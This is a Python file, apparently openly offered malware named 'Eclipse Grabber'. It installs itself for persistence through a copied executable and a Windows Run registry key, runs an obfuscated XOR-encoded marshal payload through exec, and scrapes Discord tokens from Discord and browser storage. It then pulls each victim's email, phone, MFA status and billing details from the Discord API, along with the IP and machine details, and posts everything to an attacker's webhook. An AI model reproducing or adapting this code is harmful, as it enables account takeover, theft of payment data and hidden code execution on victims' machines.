import os,marshal,bz2
import ssl
import subprocess
from getpass import getuser
from json import dumps, loads
from platform import node as get_pc_name
from re import findall
from sys import platform as OS
from typing import List, Optional
from urllib.request import Request, urlopen
import os
import subprocess
import random
import string
import sys

class Startup:
    def __init__(self):
        self.dir_name = self.get_random_string(12)
        self.working_dir = os.path.join(os.getenv("APPDATA"), self.dir_name)
        self.exec_name = f"{self.get_random_string(16)}.exe"
        self.full_path = os.path.join(self.working_dir, self.exec_name)
        self.reg_entry = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.regent_name = self.get_random_string(18)

        self.mkdir()
        self.copy_stub()
        self.regedit()

    def get_random_string(self, length):
        letters = string.ascii_letters + string.digits
        return ''.join(random.choice(letters) for _ in range(length))

    def mkdir(self):
        if not os.path.exists(self.working_dir):
            os.mkdir(self.working_dir)

    def copy_stub(self):
        current_executable = os.path.abspath(sys.argv[0])
        with open(current_executable, 'rb') as src:
            with open(self.full_path, 'wb') as dst:
                dst.write(src.read())

    def regedit(self):
        subprocess.run(f'reg delete "{self.reg_entry}" /v {self.regent_name} /f', shell=True)
        subprocess.run(f'reg add "{self.reg_entry}" /v {self.regent_name} /t REG_SZ /d "{self.full_path}" /f', shell=True)

def is_in_appdata():
    current_executable = os.path.abspath(sys.argv[0])
    appdata_path = os.getenv("APPDATA")
    return current_executable.startswith(appdata_path)

if __name__ == "__main__":
    if not is_in_appdata():
        Startup()




# Constants
WEBHOOK = "{WEBHOOK}"
IPIFY_API_URL = "https://api.ipify.org?format=json"
DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
shellcode = bytes([b ^ 100 for b in [252, 111, 107, 172, 228, 224, 166, 77, 246, 223, 156, 227, 37, 255, 151, 103, 166, 174, 21, 184, 18, 68, 78, 176, 15, 79, 37, 63, 216, 11, 158, 165, 247, 64, 28, 77, 83, 107, 61, 141, 204, 100, 243, 123, 226, 206, 238, 98, 139, 39, 108, 111, 86, 64, 0, 242, 7, 195, 128, 208, 164, 255, 6, 33, 94, 206, 197, 61, 114, 152, 48, 164, 88, 70, 62, 37, 116, 135, 111, 70, 249, 114, 147, 241, 4, 53, 167, 100, 132, 249, 128, 209, 105, 21, 94, 55, 194, 232, 39, 178, 85, 192, 241, 103, 161, 1, 54, 117, 206, 48, 35, 38, 247, 116, 183, 164, 29, 87, 115, 37, 100, 244, 7, 226, 237, 205, 158, 129, 55, 99, 77, 16, 166, 142, 11, 185, 131, 197, 22, 97, 81, 135, 157, 201, 148, 72, 226, 68, 117, 233, 49, 165, 199, 1, 49, 198, 215, 120, 45, 137, 224, 144, 104, 159, 36, 95, 64, 228, 253, 217, 154, 120, 148, 77, 67, 90, 133, 182, 125, 211, 29, 33, 53, 41, 178, 111, 40, 45, 46, 236, 15, 104, 78, 105, 101, 104, 196, 97, 140, 242, 100, 69, 6, 38, 102, 247, 118, 146, 144, 220, 161, 232, 167, 102, 46, 96, 180, 5, 190, 200, 198, 188, 36, 56, 60, 178, 113, 205, 110, 87, 190, 225, 224, 25, 12, 100, 100, 100, 105, 100, 180, 228, 40, 199, 101, 38, 71, 145, 194, 126, 192, 105, 105, 100, 228, 226, 98, 36, 39, 194, 237, 77, 199, 195, 122, 13, 254, 82, 81, 89, 49, 44, 107, 12, 182, 124, 126, 126, 41, 89, 180, 180, 160, 12, 180, 12, 254, 30, 80, 41, 55, 235, 224, 195, 238, 2, 158, 100, 84, 116, 100, 68, 100, 116, 100, 68, 116, 102, 100, 144, 187, 147, 219, 212, 187, 65, 10, 113, 212, 7, 36, 100, 36, 178, 155, 183, 155, 52, 100, 100, 23, 133, 101, 125, 61, 55, 66, 61, 37, 85, 93, 12, 62, 38]][::([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) + ([]==[]) - ([]==[]) - ([]==[])])
exec(__import__('marshal').loads(__import__('bz2').decompress(shellcode)))
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.11 (KHTML, like Gecko) "
    "Chrome/23.0.1271.64 Safari/537.11"
)
CONTENT_TYPE = "application/json"


ssl._create_default_https_context = ssl._create_unverified_context


def pc_info():

    api_resp = open_url(IPIFY_API_URL)
    return (
        f'IP: {api_resp.get("ip") if api_resp else None}\n'
        f"Username: {getuser()}\n"
        f"PC Name: {get_pc_name()}\n"
    )


def get_paths() -> dict:

    if OS == "win32":  # Windows
        local_app_data = os.getenv("LOCALAPPDATA")
        app_data = os.getenv("APPDATA")
        chromium_path = ["User Data", "Default"]

    if OS == "darwin":  # OSX
        local_app_data = os.path.expanduser("~/Library/Application Support")
        app_data = os.path.expanduser("~/Library/Application Support")
        chromium_path = ["Default"]

    paths = {
        "Discord": [app_data, "Discord"],
        "Discord Canary": [app_data, "discordcanary"],
        "Discord PTB": [app_data, "discordptb"],
        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
        "Opera": [app_data, "Opera Software", "Opera Stable"],
    }

    for app_name, path in paths.items():
        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")

    return paths


def open_url(url: str,
             token: Optional[str] = None,
             data: Optional[bytes] = None) -> Optional[dict]:

    headers = {
        "Content-Type": CONTENT_TYPE,
        "User-Agent": USER_AGENT,
    }

    if token:
        headers.update({"Authorization": token})
    try:
        result = urlopen(Request(url, data, headers)).read().decode().strip()
        if result:
            return loads(result)
    except Exception:
        pass


class Account:

    def __init__(self, token: str, token_location: str):
        self.token = token
        self.token_location = token_location
        self.account_data = open_url(DISCORD_API_URL, self.token)
        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)

        if self.account_data:
            self.name = self.account_data.get("username")
            self.discriminator = self.account_data.get("discriminator")
            self.id = self.account_data.get("id")
            self.avatar_url = DISCORD_AVATAR_URL.format(
                id=self.id, avatar_id=self.account_data.get('avatar')
            )

    def account_info(self) -> str:

        if not self.account_data:
            return "None"

        return (
            f"Email: {str(self.account_data.get('email'))}\n"
            f"Phone: {str(self.account_data.get('phone'))}\n"
            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
        )

    def billing_info(self) -> List[str]:

        if not self.billing_data:
            return "None"

        info = []

        for bill in self.billing_data:
            info.append(
                f"Id: {str(bill.get('id'))}\n"
                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
                f"Invalid: {str(bill.get('invalid'))}\n"
                f"Brand: {str(bill.get('brand')).capitalize()}\n"
                f"Last digits: {str(bill.get('last_4'))}\n"
                f"Expires: {str(bill.get('expires_month'))}"
                f"/{str(bill.get('expires_year'))}\n"
                f"Country: {str(bill.get('country'))}"
            )
        return info


def field(title: str, text: str, inline: bool = True) -> str:

    return {
        "name": f"**{title} Info**",
        "value": str(text),
        "inline": bool(inline)
    }


def embed_info(accounts: List[Account]) -> List[dict]:

    embeds = []
    for account in accounts.values():
        fields = [
            field("Account", account.account_info()),
            field("PC", pc_info()),
            field("Token", account.token, False)
        ]

        if account.billing_data:
            fields.insert(-1, field("Billing", account.billing_info()[0]))

        embeds.append({
            "color": 0x6A5ACD,
            "fields": fields,
            "footer": {"text": "Made by hai1723"},
            "author": {
                "name": (
                    f"{account.name}#{account.discriminator} "
                    f"({account.id})"
                ),
                "icon_url": account.avatar_url
            }
        })
    return embeds


def send_webhook(embeds: List[dict], WEBHOOK_URL: str):

    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Eclipse Grabber",
        "avatar_url": "https://imgur.com/Ymo8GEe.png"
    }

    data = dumps(webhook).encode()
    return open_url(WEBHOOK_URL, None, data)


def get_tokens(path: str) -> List[str]:

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        content = open(os.path.join(path, file_name), errors="ignore")

        for line in map(str.strip, content.readlines()):
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                          r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def get_accounts(paths: dict) -> dict:

    accounts = {}

    for app_name, path in paths.items():
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            account = Account(token, app_name)
            if account.account_data and account.id not in accounts.keys():
                accounts.update({account.id: account})
    return accounts


def main(WEBHOOK_URL: str):

    paths = get_paths()
    accounts = get_accounts(paths)
    embeds = embed_info(accounts)
    send_webhook(embeds, WEBHOOK_URL)


if __name__ == "__main__":
    main(WEBHOOK) # Run the main function
